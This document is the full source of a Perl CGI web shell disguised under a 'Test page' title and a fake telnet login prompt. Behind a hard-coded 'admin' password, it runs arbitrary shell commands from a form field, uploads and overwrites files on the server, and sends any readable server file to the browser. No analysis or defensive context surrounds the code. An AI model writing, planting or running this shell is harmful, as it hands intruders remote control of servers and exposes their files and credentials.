#!/usr/bin/perl
$Password = "admin"; 
$WinNT = 0;
$NTCmdSep = "&"; 
$UnixCmdSep = ";"; 
$CommandTimeoutDuration = 100000;
$ShowDynamicOutput = 1;
$CmdSep = ($WinNT ? $NTCmdSep : $UnixCmdSep);
$CmdPwd = ($WinNT ? "cd" : "pwd");
$PathSep = ($WinNT ? "\\" : "/");
$Redirector = ($WinNT ? " 2>&1 1>&2" : " 1>&1 2>&1");
sub ReadParse
{
        local (*in) = @_ if @_;
        local ($i, $loc, $key, $val);

        $MultipartFormData = $ENV{'CONTENT_TYPE'} =~ /multipart\/form-data; boundary=(.+)$/;

        if($ENV{'REQUEST_METHOD'} eq "GET")
        {
                $in = $ENV{'QUERY_STRING'};
        }
        elsif($ENV{'REQUEST_METHOD'} eq "POST")
        {
                binmode(STDIN) if $MultipartFormData & $WinNT;
                read(STDIN, $in, $ENV{'CONTENT_LENGTH'});
        }
        if($ENV{'CONTENT_TYPE'} =~ /multipart\/form-data; boundary=(.+)$/)
        {
                $Boundary = '--'.$1;
                @list = split(/$Boundary/, $in);
                $HeaderBody = $list[1];
                $HeaderBody =~ /\r\n\r\n|\n\n/;
                $Header = $`;
                $Body = $';
                $Body =~ s/\r\n$//;
                $in{'filedata'} = $Body;
                $Header =~ /filename=\"(.+)\"/;
                $in{'f'} = $1;
                $in{'f'} =~ s/\"//g;
                $in{'f'} =~ s/\s//g;
                for($i=2; $list[$i]; $i++)
                {
                        $list[$i] =~ s/^.+name=$//;
                        $list[$i] =~ /\"(\w+)\"/;
                        $key = $1;
                        $val = $';
                        $val =~ s/(^(\r\n\r\n|\n\n))|(\r\n$|\n$)//g;
                        $val =~ s/%(..)/pack("c", hex($1))/ge;
                        $in{$key} = $val;
                }
        }
        else 
        {
                @in = split(/&/, $in);
                foreach $i (0 .. $#in)
                {
                        $in[$i] =~ s/\+/ /g;
                        ($key, $val) = split(/=/, $in[$i], 2);
                        $key =~ s/%(..)/pack("c", hex($1))/ge;
                        $val =~ s/%(..)/pack("c", hex($1))/ge;
                        $in{$key} .= "\0" if (defined($in{$key}));
                        $in{$key} .= $val;
                }
        }
}
sub PrintPageHeader
{
        $EncodedCurrentDir = $CurrentDir;
        $EncodedCurrentDir =~ s/([^a-zA-Z0-9])/'%'.unpack("H*",$1)/eg;
        print "Content-type: text/html\n\n";
        print <<END;
<html>
<head>
<title>CGI</title>
$HtmlMetaHeader
</head>
<body onLoad="document.f.@_.focus()" bgcolor="#000000" topmargin="0" leftmargin="0" marginwidth="0" marginheight="0">
<table border="1" width="100%" cellspacing="0" cellpadding="2">
<tr>
<td bgcolor="#C2BFA5" bordercolor="#000080" align="center">
<b><font color="#000080" size="2">#</font></b></td>
<td bgcolor="#000080"><font face="Verdana" size="2" color="#FFFFFF"><b>Test page</b></font></td>
</tr>
<tr>
<td colspan="2" bgcolor="#C2BFA5"><font face="Verdana" size="2">
<a href="$ScriptLocation?a=upload&d=$EncodedCurrentDir">Upload File</a> |
<a href="$ScriptLocation?a=download&d=$EncodedCurrentDir">Download File</a> |
<a href="$ScriptLocation?a=logout">Disconnect</a>
</font></td>
</tr>
</table>
<font color="#C0C0C0" size="3">
END
}
sub PrintLoginScreen
{
        $Message = q$<pre></pre>
$;
#'
        print <<END;
<code>
Trying $ServerName...<br>
Connected to $ServerName<br>
Escape character is ^]
<code>$Message
END
}
sub PrintLoginFailedMessage
{
        print <<END;
<code>
<br>login: Administrator<br>
password:<br>
Login incorrect<br><br>
</code>
END
}
sub PrintLoginForm
{
        print <<END;
<code>
<form name="f" method="POST" action="$ScriptLocation">
<input type="hidden" name="a" value="login">
login: Administrator<br>
password:<input type="password" name="p">
<input type="submit" value="Enter">
</form>
</code>
END
}
sub PrintPageFooter
{
        print "</font></body></html>";
}
sub GetCookies
{
        @httpcookies = split(/; /,$ENV{'HTTP_COOKIE'});
        foreach $cookie(@httpcookies)
        {
                ($id, $val) = split(/=/, $cookie);
                $Cookies{$id} = $val;
        }
}
sub PrintLogoutScreen
{
        print "<code>Bye.<br><br></code>";
}
sub PerformLogout
{
        print "Set-Cookie: SAVEDPWD=;\n";
        &PrintPageHeader("p");
        &PrintLogoutScreen;
        &PrintLoginScreen;
        &PrintLoginForm;
        &PrintPageFooter;
}
sub PerformLogin
{
        if($LoginPassword eq $Password)
        {
                print "Set-Cookie: SAVEDPWD=$LoginPassword;\n";
                &PrintPageHeader("c");
                &PrintCommandLineInputForm;
                &PrintPageFooter;
        }
        else
        {
                &PrintPageHeader("p");
                &PrintLoginScreen;
                if($LoginPassword ne "")
                {
                        &PrintLoginFailedMessage;
                }
                &PrintLoginForm;
                &PrintPageFooter;
        }
}
sub PrintCommandLineInputForm
{
        $Prompt = $WinNT ? "$CurrentDir> " : "[admin\@$ServerName $CurrentDir]\$ ";
        print <<END;
<code>
<form name="f" method="POST" action="$ScriptLocation">
<input type="hidden" name="a" value="command">
<input type="hidden" name="d" value="$CurrentDir">
$Prompt
<input type="text" name="c">
<input type="submit" value="Enter">
</form>
</code>
END
}
sub PrintFileDownloadForm
{
        $Prompt = $WinNT ? "$CurrentDir> " : "[admin\@$ServerName $CurrentDir]\$ ";
        print <<END;
<code>
<form name="f" method="POST" action="$ScriptLocation">
<input type="hidden" name="d" value="$CurrentDir">
<input type="hidden" name="a" value="download">
$Prompt download<br><br>
Filename: <input type="text" name="f" size="35"><br><br>
Download: <input type="submit" value="Begin">
</form>
</code>
END
}
sub PrintFileUploadForm
{
        $Prompt = $WinNT ? "$CurrentDir> " : "[admin\@$ServerName $CurrentDir]\$ ";
        print <<END;
<code>
<form name="f" enctype="multipart/form-data" method="POST" action="$ScriptLocation">
$Prompt upload<br><br>
Filename: <input type="file" name="f" size="35"><br><br>
Options: &nbsp;<input type="checkbox" name="o" value="overwrite">
Overwrite if it Exists<br><br>
Upload:&nbsp;&nbsp;&nbsp;<input type="submit" value="Begin">
<input type="hidden" name="d" value="$CurrentDir">
<input type="hidden" name="a" value="upload">
</form>
</code>
END
}
sub CommandTimeout
{
        if(!$WinNT)
        {
                alarm(0);
                print <<END;
</xmp>
<code>
Command exceeded maximum time of $CommandTimeoutDuration second(s).
<br>Killed it!
<code>
END
                &PrintCommandLineInputForm;
                &PrintPageFooter;
                exit;
        }
}
sub ExecuteCommand
{
        if($RunCommand =~ m/^\s*cd\s+(.+)/)
        {
                $OldDir = $CurrentDir;
                $Command = "cd \"$CurrentDir\"".$CmdSep."cd $1".$CmdSep.$CmdPwd;
                chop($CurrentDir = `$Command`);
                &PrintPageHeader("c");
                $Prompt = $WinNT ? "$OldDir> " : "[admin\@$ServerName $OldDir]\$ ";
                print "<code>$Prompt $RunCommand</code>";
        }
        else
        {
                &PrintPageHeader("c");
                $Prompt = $WinNT ? "$CurrentDir> " : "[admin\@$ServerName $CurrentDir]\$ ";
                print "<code>$Prompt $RunCommand</code><xmp>";
                $Command = "cd \"$CurrentDir\"".$CmdSep.$RunCommand.$Redirector;
                if(!$WinNT)
                {
                        $SIG{'ALRM'} = \&CommandTimeout;
                        alarm($CommandTimeoutDuration);
                }
                if($ShowDynamicOutput)
                {
                        $|=1;
                        $Command .= " |";
                        open(CommandOutput, $Command);
                        while(<CommandOutput>)
                        {
                                $_ =~ s/(\n|\r\n)$//;
                                print "$_\n";
                        }
                        $|=0;
                }
                else
                {
                        print `$Command`;
                }
                if(!$WinNT)
                {
                        alarm(0);
                }
                print "</xmp>";
        }
        &PrintCommandLineInputForm;
        &PrintPageFooter;
}
sub PrintDownloadLinkPage
{
        local($FileUrl) = @_;
        if(-e $FileUrl)
        {
                $FileUrl =~ s/([^a-zA-Z0-9])/'%'.unpack("H*",$1)/eg;
                $DownloadLink = "$ScriptLocation?a=download&f=$FileUrl&o=go";
                $HtmlMetaHeader = "<meta HTTP-EQUIV=\"Refresh\" CONTENT=\"1; URL=$DownloadLink\">";
                &PrintPageHeader("c");
                print <<END;
<code>
Sending File $TransferFile...<br>
If the download does not start automatically,
<a href="$DownloadLink">Click Here</a>.
</code>
END
                &PrintCommandLineInputForm;
                &PrintPageFooter;
        }
        else
        {
                &PrintPageHeader("f");
                print "<code>Failed to download $FileUrl: $!</code>";
                &PrintFileDownloadForm;
                &PrintPageFooter;
        }
}
sub SendFileToBrowser
{
        local($SendFile) = @_;
        if(open(SENDFILE, $SendFile))
        {
                if($WinNT)
                {
                        binmode(SENDFILE);
                        binmode(STDOUT);
                }
                $FileSize = (stat($SendFile))[7];
                ($Filename = $SendFile) =~  m!([^/^\\]*)$!;
                print "Content-Type: application/x-unknown\n";
                print "Content-Length: $FileSize\n";
                print "Content-Disposition: attachment; filename=$1\n\n";
                print while(<SENDFILE>);
                close(SENDFILE);
        }
        else
        {
                &PrintPageHeader("f");
                print "<code>Failed to download $SendFile: $!</code>";
                &PrintFileDownloadForm;
                &PrintPageFooter;
        }
}
sub BeginDownload
{
        if(($WinNT & ($TransferFile =~ m/^\\|^.:/)) |
                (!$WinNT & ($TransferFile =~ m/^\//)))
        {
                $TargetFile = $TransferFile;
        }
        else
        {
                chop($TargetFile) if($TargetFile = $CurrentDir) =~ m/[\\\/]$/;
                $TargetFile .= $PathSep.$TransferFile;
        }

        if($Options eq "go")
        {
                &SendFileToBrowser($TargetFile);
        }
        else
        {
                &PrintDownloadLinkPage($TargetFile);
        }
}
sub UploadFile
{
        if($TransferFile eq "")
        {
                &PrintPageHeader("f");
                &PrintFileUploadForm;
                &PrintPageFooter;
                return;
        }
        &PrintPageHeader("c");
        print "<code>Uploading $TransferFile to $CurrentDir...<br>";
        chop($TargetName) if ($TargetName = $CurrentDir) =~ m/[\\\/]$/;
        $TransferFile =~ m!([^/^\\]*)$!;
        $TargetName .= $PathSep.$1;
        $TargetFileSize = length($in{'filedata'});
        if(-e $TargetName && $Options ne "overwrite")
        {
                print "Failed: Destination file already exists.<br>";
        }
        else
        {
                if(open(UPLOADFILE, ">$TargetName"))
                {
                        binmode(UPLOADFILE) if $WinNT;
                        print UPLOADFILE $in{'filedata'};
                        close(UPLOADFILE);
                        print "Transfered $TargetFileSize Bytes.<br>";
                        print "File Path: $TargetName<br>";
                }
                else
                {
                        print "Failed: $!<br>";
                }
        }
        print "</code>";
        &PrintCommandLineInputForm;
        &PrintPageFooter;
}
sub DownloadFile
{
        if($TransferFile eq "")
        {
                &PrintPageHeader("f");
                &PrintFileDownloadForm;
                &PrintPageFooter;
                return;
        }
        if(($WinNT & ($TransferFile =~ m/^\\|^.:/)) |
                (!$WinNT & ($TransferFile =~ m/^\//)))
        {
                $TargetFile = $TransferFile;
        }
        else
        {
                chop($TargetFile) if($TargetFile = $CurrentDir) =~ m/[\\\/]$/;
                $TargetFile .= $PathSep.$TransferFile;
        }

        if($Options eq "go")
        {
                &SendFileToBrowser($TargetFile);
        }
        else
        {
                &PrintDownloadLinkPage($TargetFile);
        }
}
&ReadParse;
&GetCookies;

$ScriptLocation = $ENV{'SCRIPT_NAME'};
$ServerName = $ENV{'SERVER_NAME'};
$LoginPassword = $in{'p'};
$RunCommand = $in{'c'};
$TransferFile = $in{'f'};
$Options = $in{'o'};

$Action = $in{'a'};
$Action = "login" if($Action eq "");
$CurrentDir = $in{'d'};
chop($CurrentDir = `$CmdPwd`) if($CurrentDir eq "");

$LoggedIn = $Cookies{'SAVEDPWD'} eq $Password;

if ($LoggedIn && $Action eq "login")
{
		&ExecuteCommand;
}
elsif($Action eq "login" || !$LoggedIn)
{
        &PerformLogin;
}
elsif($Action eq "command")
{
        &ExecuteCommand;
}
elsif($Action eq "upload")
{
        &UploadFile;
}
elsif($Action eq "download")
{
        &DownloadFile;
}
elsif($Action eq "logout")
{
        &PerformLogout;
}